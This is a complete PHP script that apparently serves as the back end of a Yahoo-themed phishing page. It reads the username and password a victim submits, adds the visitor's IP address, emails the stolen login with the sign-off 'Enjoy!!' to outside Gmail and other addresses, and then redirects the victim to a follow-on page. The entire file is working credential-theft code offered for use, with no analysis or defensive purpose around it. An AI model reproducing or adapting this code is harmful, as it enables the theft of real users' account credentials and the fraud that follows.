<?php

$subject = "YAHOO INFO FROM [ ".$_SERVER['REMOTE_ADDR']." ] ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['useremail']."\n";
$message  = "Email: ".$_POST["username"]."\n";
$message .= "Passsword: ".$_POST["password"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: emmaobinna@yandex' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("results732@gmail.com,admin@f-point.us",$subject,$message, $headers);



header("location: email2.html"); 



?>
